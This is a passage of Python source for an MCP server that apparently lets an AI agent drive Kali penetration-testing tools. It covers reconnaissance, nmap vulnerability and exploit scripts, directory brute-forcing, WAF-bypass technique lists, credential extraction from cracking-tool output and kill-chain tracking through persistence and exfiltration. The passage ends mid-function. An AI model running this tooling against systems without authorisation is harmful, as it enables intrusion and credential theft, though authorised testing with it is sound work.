        else: result["risk_rating"] = "INFORMATIONAL"

        # Build recommended attack path (ordered by impact)
        if result["exploit_chains"]:
            for chain in sorted(result["exploit_chains"], key=lambda c: {"critical": 0, "high": 1, "medium": 2}.get(c["severity"], 3)):
                result["recommended_attack_path"].append({
                    "step": chain["chain"],
                    "impact": chain["yields"],
                    "severity": chain["severity"],
                })

        # Collect all MITRE techniques
        mitre_set = set()
        for chain in result["exploit_chains"]:
            mitre_set.update(chain.get("mitre", []))
        for v in vulns:
            mitre_set.update(v.mitre_techniques)
        result["mitre_coverage"] = sorted(mitre_set)

        return result

    def get_service_checks(self, service_name: str) -> Dict:
        """Get recommended security checks for a detected service"""
        svc = service_name.lower()
        for known_svc, checks in self.SERVICE_VULN_MAP.items():
            if known_svc in svc:
                return {"service": known_svc, **checks}
        return {"service": svc, "checks": ["generic_scan"], "common_cves": []}

    def get_vulns(self, target: str) -> List[VulnFinding]:
        return self._vuln_db.get(target, [])


class KillChainTracker:
    """Track pentest progress through kill chain phases with MITRE ATT&CK mapping"""

    MITRE_MAPPING = {
        KillChainPhase.RECONNAISSANCE: {
            "techniques": ["T1595", "T1592", "T1589", "T1590", "T1591", "T1596", "T1593", "T1594"],
            "tools": ["recon_engine", "osint_harvester"],
            "description": "Active/passive scanning, footprinting, OSINT gathering",
        },
        KillChainPhase.WEAPONIZATION: {
            "techniques": ["T1587", "T1588", "T1584", "T1585", "T1586"],
            "tools": ["payload_factory", "exploit_engine"],
            "description": "Payload crafting, exploit preparation, infrastructure setup",
        },
        KillChainPhase.DELIVERY: {
            "techniques": ["T1566", "T1195", "T1189", "T1190"],
            "tools": ["web_assault", "injection_matrix", "ssrf_hunter"],
            "description": "Exploit delivery via web, phishing, supply chain",
        },
        KillChainPhase.EXPLOITATION: {
            "techniques": ["T1203", "T1210", "T1211", "T1212"],
            "tools": ["exploit_engine", "injection_matrix", "credential_cracker", "auth_destroyer"],
            "description": "Vulnerability exploitation, credential attacks, auth bypass",
        },
        KillChainPhase.INSTALLATION: {
            "techniques": ["T1059", "T1053", "T1547", "T1546", "T1543"],
            "tools": ["post_exploit_ops"],
            "description": "Persistence mechanisms, backdoors, scheduled tasks",
        },
        KillChainPhase.COMMAND_CONTROL: {
            "techniques": ["T1071", "T1095", "T1572", "T1090", "T1573"],
            "tools": ["post_exploit_ops", "network_dominator"],
            "description": "C2 channels, tunneling, proxy chains, encrypted comms",
        },
        KillChainPhase.ACTIONS_ON_OBJECTIVES: {
            "techniques": ["T1005", "T1039", "T1048", "T1567", "T1486"],
            "tools": ["post_exploit_ops", "reporting_engine"],
            "description": "Data exfiltration, impact assessment, objective completion",
        },
    }

    def __init__(self, memory: PentestMemory):
        self.memory = memory
        self._progress: Dict[str, Dict[str, Any]] = defaultdict(lambda: {
            phase.value: {"status": "not_started", "findings": [], "tools_used": []}
            for phase in KillChainPhase
        })

    def advance_phase(self, target: str, phase: KillChainPhase, tool: str, findings: List[str]):
        """Record progress in a kill chain phase"""
        p = self._progress[target][phase.value]
        p["status"] = "in_progress" if not findings else "completed"
        p["tools_used"].append(tool)
        p["findings"].extend(findings)
        p["timestamp"] = datetime.datetime.now().isoformat()
        logger.info(f"[KILLCHAIN] {target} → {phase.value}: {len(findings)} findings via {tool}")

    def get_progress(self, target: str) -> Dict:
        """Get full kill chain progress for a target"""
        progress = dict(self._progress[target])
        completed = sum(1 for p in progress.values() if p["status"] == "completed")
        total = len(KillChainPhase)
        return {
            "target": target,
            "phases": progress,
            "completion": f"{completed}/{total}",
            "completion_pct": round(completed / total * 100, 1),
            "next_phase": self._suggest_next_phase(target),
        }

    def _suggest_next_phase(self, target: str) -> Dict:
        """Suggest the next kill chain phase to pursue"""
        for phase in KillChainPhase:
            state = self._progress[target][phase.value]
            if state["status"] == "not_started":
                mapping = self.MITRE_MAPPING[phase]
                return {
                    "phase": phase.value,
                    "description": mapping["description"],
                    "recommended_tools": mapping["tools"],
                    "mitre_techniques": mapping["techniques"][:4],
                }
        return {"phase": "complete", "description": "All kill chain phases executed"}


class DeepOutputParser:
    """Advanced output parsing: extract structured intel from raw tool output"""

    @staticmethod
    def parse_nmap_service_vulns(nmap_xml: str) -> List[Dict]:
        """Extract CVEs, vuln scripts, version-based vulnerabilities from nmap XML"""
        vulns = []
        try:
            root = ET.fromstring(nmap_xml)
            for host in root.findall(".//host"):
                addr = ""
                addr_el = host.find(".//address[@addrtype='ipv4']")
                if addr_el is not None:
                    addr = addr_el.get("addr", "")
                for port_el in host.findall(".//port"):
                    port_id = port_el.get("portid", "0")
                    svc = port_el.find("service")
                    svc_name = svc.get("name", "") if svc is not None else ""
                    svc_product = svc.get("product", "") if svc is not None else ""
                    svc_version = svc.get("version", "") if svc is not None else ""
                    # Parse NSE script output for vulns
                    for script in port_el.findall(".//script"):
                        script_id = script.get("id", "")
                        script_output = script.get("output", "")
                        # Extract CVEs
                        cves = re.findall(r"CVE-\d{4}-\d{4,7}", script_output)
                        vuln_state = "VULNERABLE" in script_output.upper()
                        if cves or vuln_state:
                            vulns.append({
                                "host": addr, "port": int(port_id),
                                "service": svc_name, "product": svc_product,
                                "version": svc_version, "script": script_id,
                                "cves": cves, "vulnerable": vuln_state,
                                "output": script_output[:500],
                            })
                    # Version-based vuln detection (without scripts)
                    if svc_product and svc_version:
                        vulns.append({
                            "host": addr, "port": int(port_id),
                            "service": svc_name, "product": svc_product,
                            "version": svc_version, "type": "version_detected",
                            "note": f"Version fingerprint: {svc_product} {svc_version} — check for known CVEs",
                        })
        except ET.ParseError:
            pass
        return vulns

    @staticmethod
    def parse_error_page(html: str) -> Dict:
        """Deep analysis of error pages for tech fingerprinting and info disclosure"""
        findings = {"technologies": [], "info_leaks": [], "debug_mode": False, "stack_traces": []}
        # Technology signatures (expanded)
        tech_sigs = {
            "Whitelabel Error Page": {"tech": "spring-boot", "severity": "medium", "info": "Spring Boot default error handler exposed"},
            "django.core": {"tech": "django", "severity": "medium", "info": "Django debug mode likely enabled"},
            "Traceback (most recent call last)": {"tech": "python", "severity": "high", "info": "Python stack trace exposed"},
            "Laravel": {"tech": "laravel", "severity": "medium", "info": "Laravel framework detected"},
            "at org.apache": {"tech": "java/tomcat", "severity": "high", "info": "Java stack trace exposed"},
            "Microsoft .NET Framework": {"tech": "aspnet", "severity": "medium", "info": ".NET framework details exposed"},
            "X-Powered-By: Express": {"tech": "express", "severity": "low", "info": "Express.js detected"},
            "wp-content": {"tech": "wordpress", "severity": "low", "info": "WordPress detected"},
            "Joomla": {"tech": "joomla", "severity": "low", "info": "Joomla CMS detected"},
            "drupal": {"tech": "drupal", "severity": "low", "info": "Drupal CMS detected"},
            "PHPSESSID": {"tech": "php", "severity": "low", "info": "PHP session detected"},
            "ASP.NET_SessionId": {"tech": "aspnet", "severity": "low", "info": "ASP.NET session detected"},
            "struts": {"tech": "apache-struts", "severity": "high", "info": "Apache Struts detected (check for RCE CVEs)"},
            "weblogic": {"tech": "weblogic", "severity": "high", "info": "Oracle WebLogic detected (check for deser CVEs)"},
            "jboss": {"tech": "jboss", "severity": "high", "info": "JBoss detected (check for deser/invoke CVEs)"},
        }
        for sig, details in tech_sigs.items():
            if sig.lower() in html.lower():
                findings["technologies"].append(details)

        # Info leak patterns
        leak_patterns = [
            (r"(?:password|passwd|pwd)\s*[:=]\s*['\"]?(\S+)", "password_leak"),
            (r"(?:api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})", "api_key_leak"),
            (r"(?:secret|token)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})", "secret_leak"),
            (r"(?:jdbc|mysql|postgres|mongodb)://[^\s<\"']+", "connection_string"),
            (r"/(?:home|var|opt|usr)/[\w/.\-]+\.(?:py|rb|php|js|java|conf|yml|xml|env)", "file_path_leak"),
            (r"(?:AWS_ACCESS_KEY|AKIA)[A-Z0-9]{16,}", "aws_key_leak"),
            (r"(?:BEGIN RSA PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY)", "private_key_leak"),
            (r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b(?!\.)", "internal_ip_leak"),
            (r"(?:SQL syntax|mysql_fetch|pg_query|ORA-\d{5})", "sql_error_leak"),
        ]
        for pattern, leak_type in leak_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                findings["info_leaks"].append({
                    "type": leak_type, "count": len(matches),
                    "samples": [m[:50] if isinstance(m, str) else str(m)[:50] for m in matches[:3]],
                })

        # Stack trace extraction
        stack_patterns = [
            r"(?:Traceback.*?(?:\n.*?)+(?:Error|Exception).*)",
            r"(?:at\s+[\w.$]+\([\w.]+:\d+\)(?:\n\s*at.*)*)",
            r"(?:Stack trace:.*?(?:\n.*?){1,20})",
        ]
        for pattern in stack_patterns:
            matches = re.findall(pattern, html, re.DOTALL)
            for m in matches[:2]:
                findings["stack_traces"].append(m[:500])
                findings["debug_mode"] = True

        return findings

    @staticmethod
    def parse_nuclei_output(output: str) -> List[Dict]:
        """Parse nuclei findings into structured vulnerability data"""
        findings = []
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("[INF]"):
                continue
            # nuclei output: [severity] [template-id] [protocol] url [matched-at] [extra-info]
            match = re.match(
                r"\[(\w+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(.+?)(?:\s+\[(.+)\])?$",
                line
            )
            if match:
                severity, template_id, protocol, url, extra = match.groups()
                findings.append({
                    "severity": severity.lower(),
                    "template": template_id,
                    "protocol": protocol,
                    "url": url.strip(),
                    "extra": extra or "",
                    "cves": re.findall(r"CVE-\d{4}-\d{4,7}", line),
                })
        return findings

    @staticmethod
    def extract_credentials_from_output(output: str) -> List[Dict]:
        """Extract credentials from any tool output"""
        creds = []
        patterns = [
            # hydra: [port][service] host: X login: Y password: Z
            (r"\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)",
             lambda m: {"port": m[0], "service": m[1], "host": m[2], "username": m[3], "password": m[4]}),
            # john: password (username)
            (r"^(\S+)\s+\((\S+)\)\s*$",
             lambda m: {"password": m[0], "username": m[1]}),
            # hashcat: hash:password
            (r"^([a-f0-9]{32,}):(.+)$",
             lambda m: {"hash": m[0], "password": m[1]}),
            # secretsdump: domain\user:rid:lmhash:nthash
            (r"^(\S+\\?\S+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
             lambda m: {"account": m[0], "rid": m[1], "lm_hash": m[2], "nt_hash": m[3]}),
            # impacket format: user:password
            (r"^\[.\]\s+(\S+):(\S+)\s*$",
             lambda m: {"username": m[0], "password": m[1]}),
        ]
        for line in output.split("\n"):
            line = line.strip()
            for pattern, extractor in patterns:
                match = re.findall(pattern, line, re.MULTILINE)
                for m in match:
                    creds.append(extractor(m if isinstance(m, tuple) else (m,)))
        return creds


class ParallelExecutor:
    """Execute independent tool modules in parallel with coordination"""

    @staticmethod
    async def run_parallel(tasks: List[Dict], max_concurrent: int = 5) -> List[Dict]:
        """Run multiple async tool calls in parallel
        tasks: [{"name": "recon", "coro": coroutine, "timeout": 300}, ...]
        """
        semaphore = asyncio.Semaphore(max_concurrent)
        results = []

        async def _run_one(task: Dict) -> Dict:
            async with semaphore:
                name = task["name"]
                t0 = time.time()
                try:
                    result = await asyncio.wait_for(task["coro"], timeout=task.get("timeout", 300))
                    elapsed = round(time.time() - t0, 1)
                    return {"name": name, "status": "success", "result": result, "elapsed_s": elapsed}
                except asyncio.TimeoutError:
                    return {"name": name, "status": "timeout", "result": None, "elapsed_s": task.get("timeout", 300)}
                except Exception as e:
                    elapsed = round(time.time() - t0, 1)
                    return {"name": name, "status": "error", "error": str(e), "elapsed_s": elapsed}

        gathered = await asyncio.gather(*[_run_one(t) for t in tasks], return_exceptions=True)
        for item in gathered:
            if isinstance(item, Exception):
                results.append({"name": "unknown", "status": "exception", "error": str(item)})
            else:
                results.append(item)
        return results


# ============================================================================
# GLOBAL INSTANCES
# ============================================================================

session_manager = SessionManager()
pentest_memory = PentestMemory()
rate_limit_detector = RateLimitDetector()
orchestrator = IntelligentOrchestrator(pentest_memory, rate_limit_detector)
vuln_correlator = VulnCorrelator(pentest_memory)
kill_chain = KillChainTracker(pentest_memory)
deep_parser = DeepOutputParser()
parallel_executor = ParallelExecutor()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_timestamp() -> str:
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def generate_execution_id() -> str:
    return f"{generate_timestamp()}_{uuid.uuid4().hex[:8]}"

def sanitize_filename(name: str) -> str:
    return re.sub(r"[^\w.\-]", "_", name.replace("://", "_").replace("/", "_"))[:100]


async def run_command(cmd: List[str], timeout: int = 300, cwd: str = None) -> Dict:
    """Universal command runner with timeout, logging, and error handling"""
    start = time.time()
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return {
                "success": False,
                "command": " ".join(cmd),
                "error": f"Timeout after {timeout}s",
                "duration": time.time() - start,
            }
        return {
            "success": proc.returncode == 0,
            "command": " ".join(cmd),
            "stdout": stdout.decode(errors="replace")[:50000],
            "stderr": stderr.decode(errors="replace")[:10000],
            "return_code": proc.returncode,
            "duration": time.time() - start,
        }
    except FileNotFoundError:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": f"Tool not found: {cmd[0]}. Install with: apt install {cmd[0]}",
            "duration": time.time() - start,
        }
    except Exception as e:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": str(e),
            "duration": time.time() - start,
        }


async def run_command_shell(cmd_str: str, timeout: int = 300) -> Dict:
    """Run a shell command string"""
    start = time.time()
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd_str,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return {"success": False, "error": f"Timeout after {timeout}s", "duration": time.time() - start}
        return {
            "success": proc.returncode == 0,
            "stdout": stdout.decode(errors="replace")[:50000],
            "stderr": stderr.decode(errors="replace")[:10000],
            "return_code": proc.returncode,
            "duration": time.time() - start,
        }
    except Exception as e:
        return {"success": False, "error": str(e), "duration": time.time() - start}


# ============================================================================
# MCP SERVER INITIALIZATION
# ============================================================================

mcp = FastMCP("Kali MCP Server v6 - Autonomous Pentest Engine")


# ============================================================================
# MODULE 19: SESSION OPS (start/health/summary/memory)
# Replaces: start_session, server_health, session_summary, get_chain_summary, pentest_memory_query
# ============================================================================

@mcp.tool()
async def session_ops(
    action: str = "health",
    session_name: Optional[str] = None,
    target: Optional[str] = None,
    finding_type: Optional[str] = None,
) -> str:
    """
    Session & memory management hub.
    Actions: start, health, summary, memory_query, recommendations
    """
    try:
        if action == "start":
            sid = session_manager.create_session(session_name)
            return json.dumps({"status": "session_created", "session_id": sid})

        elif action == "health":
            import shutil
            tools_available = {}
            for tool in ["nmap", "nikto", "sqlmap", "hydra", "john", "hashcat",
                         "gobuster", "ffuf", "nuclei", "wpscan", "metasploit",
                         "bettercap", "aircrack-ng", "responder", "certipy",
                         "bloodhound-python", "impacket-secretsdump", "ligolo-ng"]:
                tools_available[tool] = shutil.which(tool.split("-")[0]) is not None or shutil.which(tool) is not None
            return json.dumps({
                "status": "healthy",
                "version": "6.0.0",
                "architecture": "20 unified mega-modules",
                "session": session_manager.current_session_id,
                "active_executions": len(session_manager.executions),
                "memory_targets": len(pentest_memory._findings),
                "tools_available": tools_available,
            }, indent=2)

        elif action == "summary":
            sessions = list(session_manager.sessions.values())
            return json.dumps({
                "total_sessions": len(sessions),
                "current_session": session_manager.current_session_id,
                "total_executions": len(session_manager.executions),
                "memory_summary": {
                    t: pentest_memory.get_context(t) for t in list(pentest_memory._findings.keys())[:10]
                },
            }, indent=2)

        elif action == "memory_query":
            if not target:
                return json.dumps({"error": "target required for memory_query"})
            context = pentest_memory.get_context(target)
            findings = pentest_memory.get_findings(target, finding_type or "")
            return json.dumps({
                "context": context,
                "findings_count": len(findings),
                "findings": findings[:50],
            }, indent=2)

        elif action == "recommendations":
            if not target:
                return json.dumps({"error": "target required for recommendations"})
            recs = orchestrator.recommend_next_tools(target)
            stack = orchestrator.adapt_to_stack(target)
            return json.dumps({
                "target": target,
                "recommendations": recs,
                "stack_adaptation": stack,
                "context": pentest_memory.get_context(target),
            }, indent=2)

        else:
            return json.dumps({"error": f"Unknown action: {action}. Use: start, health, summary, memory_query, recommendations"})

    except Exception as e:
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 1: RECON ENGINE
# Replaces: nmap_scan, target_profiler, adaptive_recon, smart_fingerprint, web_tech_detect, origin_ip_hunter
# ============================================================================

@mcp.tool()
async def recon_engine(
    target: str,
    depth: str = "deep",
    modules: str = "all",
    ports: str = "top1000",
    timeout: int = 600,
) -> str:
    """
    Unified reconnaissance engine. Combines: nmap, fingerprinting, tech detection,
    origin IP hunting, TLS analysis, error page analysis, favicon hashing.

    depth: stealth|light|deep|aggressive
    modules: all | comma-separated: nmap,fingerprint,tech,origin,tls
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("recon_engine", target, {"depth": depth, "modules": modules})
    results = {"target": target, "depth": depth, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["nmap", "fingerprint", "tech", "origin", "tls"]

        # --- NMAP SCAN ---
        if "nmap" in mod_list:
            nmap_args = ["nmap", "-oX", "-"]
            if depth == "stealth":
                nmap_args.extend(["-sS", "-T2", "--top-ports", "100"])
            elif depth == "light":
                nmap_args.extend(["-sV", "-T3", "--top-ports", "1000"])
            elif depth == "deep":
                nmap_args.extend(["-sV", "-sC", "-O", "-T4"])
                if ports == "top1000":
                    nmap_args.extend(["--top-ports", "1000"])
                elif ports == "all":
                    nmap_args.extend(["-p-"])
                else:
                    nmap_args.extend(["-p", ports])
            elif depth == "aggressive":
                nmap_args.extend(["-sV", "-sC", "-O", "-A", "-T4", "-p-",
                                  "--script", "vuln,exploit,auth,default"])
            nmap_args.append(target)
            nmap_result = await run_command(nmap_args, timeout=timeout)
            open_ports = []
            services = []
            os_info = []
            if nmap_result["success"] and nmap_result.get("stdout"):
                try:
                    root = ET.fromstring(nmap_result["stdout"])
                    for host in root.findall(".//host"):
                        for port_el in host.findall(".//port"):
                            state = port_el.find("state")
                            if state is not None and state.get("state") == "open":
                                port_id = port_el.get("portid")
                                proto = port_el.get("protocol", "tcp")
                                svc = port_el.find("service")
                                svc_name = svc.get("name", "unknown") if svc is not None else "unknown"
                                svc_product = svc.get("product", "") if svc is not None else ""
                                svc_version = svc.get("version", "") if svc is not None else ""
                                open_ports.append(int(port_id))
                                services.append({
                                    "port": int(port_id), "proto": proto,
                                    "service": svc_name, "product": svc_product,
                                    "version": svc_version,
                                })
                        for os_match in host.findall(".//osmatch"):
                            os_info.append({"name": os_match.get("name"), "accuracy": os_match.get("accuracy")})
                except ET.ParseError:
                    pass

            # --- DEEP ANALYSIS: NSE vuln extraction, service risk mapping, CVSS ---
            nmap_vulns = []
            if nmap_result["success"] and nmap_result.get("stdout"):
                nmap_vulns = deep_parser.parse_nmap_service_vulns(nmap_result["stdout"])
            service_risk_map = []
            for svc in services:
                svc_checks = vuln_correlator.get_service_checks(svc["service"])
                risk_entry = {
                    "port": svc["port"], "service": svc["service"],
                    "product": svc["product"], "version": svc["version"],
                    "recommended_checks": svc_checks["checks"],
                    "known_cves": svc_checks["common_cves"],
                }
                # Version-based CVSS (outdated = higher risk)
                if svc["version"]:
                    risk_entry["note"] = f"Version {svc['version']} detected — verify against CVE databases"
                service_risk_map.append(risk_entry)
                # Register version-detected findings in correlator
                if svc["product"] and svc["version"]:
                    score, vector, severity = CVSSCalculator.score_for_vuln_type("info_disclosure")
                    vuln_correlator.add_vulnerability(VulnFinding(
                        vuln_id=f"svc_{svc['port']}_{svc['service']}",
                        title=f"{svc['product']} {svc['version']} on port {svc['port']}",
                        severity="info", cvss_score=score, cvss_vector=vector,
                        target=target, port=svc["port"], service=svc["service"],
                        evidence=f"Product: {svc['product']}, Version: {svc['version']}",
                        kill_chain_phase="reconnaissance",
                        mitre_techniques=["T1595.002"],
                    ))
            # Register NSE-detected vulns
            for nv in nmap_vulns:
                if nv.get("vulnerable"):
                    score, vector, severity = CVSSCalculator.score_for_vuln_type("rce")
                    vuln_correlator.add_vulnerability(VulnFinding(
                        vuln_id=nv.get("cves", ["nse_vuln"])[0] if nv.get("cves") else f"nse_{nv.get('script','')}",
                        title=f"NSE {nv.get('script','')} vulnerability on port {nv.get('port',0)}",
                        severity=severity, cvss_score=score, cvss_vector=vector,
                        target=target, port=nv.get("port", 0), service=nv.get("service", ""),
                        evidence=nv.get("output", "")[:300], exploitable=True,
                        kill_chain_phase="exploitation",
                        mitre_techniques=["T1210"],
                    ))

            results["modules"]["nmap"] = {
                "open_ports": open_ports,
                "services": services,
                "os_detection": os_info[:5],
                "nse_vulnerabilities": nmap_vulns[:20],
                "service_risk_map": service_risk_map,
                "raw_available": bool(nmap_result.get("stdout")),
            }
            pentest_memory.store_finding(target, "recon_engine", "open_ports",
                                         {"ports": open_ports, "services": services})
            if os_info:
                pentest_memory.store_finding(target, "recon_engine", "os_detected",
                                             {"os": os_info[0]["name"]})

            # Kill chain: mark reconnaissance phase
            kill_chain.advance_phase(target, KillChainPhase.RECONNAISSANCE, "recon_engine",
                                      [f"ports:{','.join(str(p) for p in open_ports[:10])}",
                                       f"services:{len(services)}",
                                       f"nse_vulns:{len(nmap_vulns)}"])

        # --- FINGERPRINT ---
        if "fingerprint" in mod_list:
            fp_results = {"headers": {}, "technologies": [], "error_signatures": [], "favicon_hash": None}
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target.split("://")[-1].split("/")[0].split(":")[0], 80),
                    timeout=10,
                )
                host = target.split("://")[-1].split("/")[0].split(":")[0]
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                response = await asyncio.wait_for(reader.read(8192), timeout=10)
                writer.close()
                resp_text = response.decode(errors="replace")
                for line in resp_text.split("\r\n"):
                    if ": " in line and not line.startswith("HTTP"):
                        key, val = line.split(": ", 1)
                        fp_results["headers"][key.lower()] = val
                # Tech detection from headers
                powered_by = fp_results["headers"].get("x-powered-by", "")
                server = fp_results["headers"].get("server", "")
                if "express" in powered_by.lower():
                    fp_results["technologies"].append("Express/Node.js")
                    pentest_memory.store_tech(target, {"framework": "express", "runtime": "nodejs"})
                elif "php" in powered_by.lower():
                    fp_results["technologies"].append(f"PHP ({powered_by})")
                    pentest_memory.store_tech(target, {"framework": "php", "version": powered_by})
                elif "asp.net" in powered_by.lower():
                    fp_results["technologies"].append("ASP.NET")
                    pentest_memory.store_tech(target, {"framework": "aspnet"})
                if "nginx" in server.lower():
                    fp_results["technologies"].append(f"Nginx ({server})")
                elif "apache" in server.lower():
                    fp_results["technologies"].append(f"Apache ({server})")
                if "x-application-context" in fp_results["headers"]:
                    fp_results["technologies"].append("Spring Boot")
                    pentest_memory.store_tech(target, {"framework": "spring-boot"})
                # Error page fingerprint
                error_sigs = {
                    "Whitelabel Error Page": "spring-boot",
                    "django.core": "django",
                    "Traceback (most recent call last)": "python",
                    "Laravel": "laravel",
                    "at org.apache": "java/tomcat",
                    "Microsoft .NET Framework": "aspnet",
                }
                for sig, tech in error_sigs.items():
                    if sig in resp_text:
                        fp_results["error_signatures"].append({"signature": sig, "tech": tech})
                        pentest_memory.store_tech(target, {"framework": tech})
            except Exception:
                pass
            results["modules"]["fingerprint"] = fp_results

        # --- TECH DETECTION (wappalyzer-style) ---
        if "tech" in mod_list:
            tech_result = await run_command(
                ["whatweb", "--color=never", "-a", "3" if depth in ["deep", "aggressive"] else "1", target],
                timeout=60,
            )
            results["modules"]["tech"] = {
                "output": tech_result.get("stdout", "")[:3000],
                "success": tech_result.get("success", False),
            }

        # --- ORIGIN IP HUNTING ---
        if "origin" in mod_list:
            origin_results = {"methods": []}
            # DNS history
            dns_result = await run_command(["dig", "+short", "ANY", target.split("://")[-1].split("/")[0]], timeout=15)
            if dns_result["success"]:
                origin_results["dns_records"] = dns_result["stdout"].strip().split("\n")

            # Check for CDN bypass
            for subdomain in ["direct", "origin", "backend", "api", "staging", "dev", "internal"]:
                hostname = target.split("://")[-1].split("/")[0]
                test_host = f"{subdomain}.{hostname}"
                try:
                    ips = socket.getaddrinfo(test_host, None, socket.AF_INET)
                    if ips:
                        origin_results["methods"].append({
                            "method": "subdomain_resolve",
                            "subdomain": test_host,
                            "ips": list(set(addr[4][0] for addr in ips)),
                        })
                except (socket.gaierror, OSError):
                    pass
            results["modules"]["origin"] = origin_results

        # --- TLS ANALYSIS ---
        if "tls" in mod_list:
            hostname = target.split("://")[-1].split("/")[0].split(":")[0]
            tls_result = await run_command(
                ["openssl", "s_client", "-connect", f"{hostname}:443", "-servername", hostname],
                timeout=15,
            )
            tls_data = {}
            if tls_result.get("stdout"):
                out = tls_result["stdout"]
                cert_match = re.search(r"subject=(.+)", out)
                issuer_match = re.search(r"issuer=(.+)", out)
                if cert_match:
                    tls_data["subject"] = cert_match.group(1).strip()
                if issuer_match:
                    tls_data["issuer"] = issuer_match.group(1).strip()
                proto_match = re.search(r"Protocol\s*:\s*(\S+)", out)
                cipher_match = re.search(r"Cipher\s*:\s*(\S+)", out)
                if proto_match:
                    tls_data["protocol"] = proto_match.group(1)
                if cipher_match:
                    tls_data["cipher"] = cipher_match.group(1)
            results["modules"]["tls"] = tls_data

        # --- INTELLIGENCE: Correlation + Kill Chain + Attack Path ---
        results["recommendations"] = orchestrator.recommend_next_tools(target)
        results["correlation"] = vuln_correlator.correlate(target)
        results["kill_chain"] = kill_chain.get_progress(target)
        results["intelligence_summary"] = {
            "risk_rating": results["correlation"].get("risk_rating", "unknown"),
            "attack_surface_score": results["correlation"].get("attack_surface_score", 0),
            "exploit_chains_detected": len(results["correlation"].get("exploit_chains", [])),
            "mitre_techniques_covered": len(results["correlation"].get("mitre_coverage", [])),
            "kill_chain_completion": results["kill_chain"].get("completion_pct", 0),
        }
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 2: WEB ASSAULT
# Replaces: nikto_scan, gobuster_scan, ffuf_fuzz, context_fuzzer, source_map_extractor,
#           waf_fingerprint, enhanced_waf_bypass
# ============================================================================

@mcp.tool()
async def web_assault(
    target: str,
    depth: str = "deep",
    modules: str = "all",
    wordlist: str = "auto",
    extensions: str = "php,html,js,asp,aspx,jsp,json,xml,txt,bak,env",
    threads: int = 50,
    timeout: int = 600,
) -> str:
    """
    Unified web attack surface scanner. Combines: nikto, gobuster/ffuf directory brute,
    source map extraction, WAF fingerprinting & bypass, context-aware fuzzing.

    depth: stealth|light|deep|aggressive
    modules: all | comma-separated: nikto,dirbrute,sourcemaps,waf,fuzz
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("web_assault", target, {"depth": depth, "modules": modules})
    results = {"target": target, "depth": depth, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["nikto", "dirbrute", "sourcemaps", "waf", "fuzz"]
        delay = rate_limit_detector.get_delay(target)

        # --- WAF FINGERPRINT (run first to adapt strategy) ---
        if "waf" in mod_list:
            waf_data = {"detected": False, "type": "none", "bypass_techniques": []}
            wafw00f = await run_command(["wafw00f", target, "-o", "-"], timeout=30)
            if wafw00f.get("success") and wafw00f.get("stdout"):
                out = wafw00f["stdout"]
                if "is behind" in out:
                    waf_match = re.search(r"is behind (.+?)(?:\n|$)", out)
                    if waf_match:
                        waf_data["detected"] = True
                        waf_data["type"] = waf_match.group(1).strip()
            # If WAF detected, build bypass strategy
            if waf_data["detected"]:
                waf_type = waf_data["type"].lower()
                bypass = []
                if "cloudflare" in waf_type:
                    bypass = [
                        "Origin IP via DNS history/subdomain leak",
                        "HTTP/2 smuggling", "Unicode normalization",
                        "Chunked transfer encoding", "Case variation in paths",
                    ]
                elif "aws" in waf_type or "waf" in waf_type:
                    bypass = ["Region-specific bypass", "Content-Type switching",
                              "Payload fragmentation", "URL encoding chains"]
                elif "modsecurity" in waf_type:
                    bypass = ["Double encoding", "Comment injection in SQL",
                              "Multipart boundary manipulation", "Charset switching"]
                else:
                    bypass = ["Header injection (X-Forwarded-For)", "HTTP method override",
                              "Path normalization tricks", "Chunked encoding"]
                waf_data["bypass_techniques"] = bypass
                pentest_memory.store_finding(target, "web_assault", "waf_detected",
                                             {"type": waf_data["type"], "bypasses": bypass})
            results["modules"]["waf"] = waf_data

        # --- NIKTO SCAN ---
        if "nikto" in mod_list:
            nikto_args = ["nikto", "-h", target, "-Format", "json", "-o", "-"]
            if depth == "stealth":
                nikto_args.extend(["-Tuning", "1"])
            elif depth == "aggressive":
                nikto_args.extend(["-Tuning", "123456789abcde"])
            nikto_result = await run_command(nikto_args, timeout=min(timeout, 300))
            findings = []
            if nikto_result.get("stdout"):
                try:
                    nikto_json = json.loads(nikto_result["stdout"])
                    if isinstance(nikto_json, list):
                        for item in nikto_json:
